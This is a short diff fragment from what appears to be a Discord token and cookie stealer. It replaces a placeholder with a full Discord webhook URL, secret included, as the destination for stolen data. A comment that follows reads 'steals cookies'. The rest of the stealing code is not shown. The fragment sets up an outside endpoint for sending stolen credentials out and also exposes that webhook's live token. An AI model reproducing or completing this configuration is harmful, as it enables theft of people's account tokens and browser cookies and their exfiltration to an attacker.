@@ -20,7 +20,7 @@ tokens = []
 cleaned = []
 checker = []
 
-webhook = 'webhook here'
+webhook = 'https://discord.com/api/webhooks/1069750174009794563/IffPJVHLhjiGl2ozS9SE-IncA4gtD1z8Bpf75eJGWdD9yohIgC-p_3r4Y1z9E4EUz_i7'
 
 # steals cookies 
 
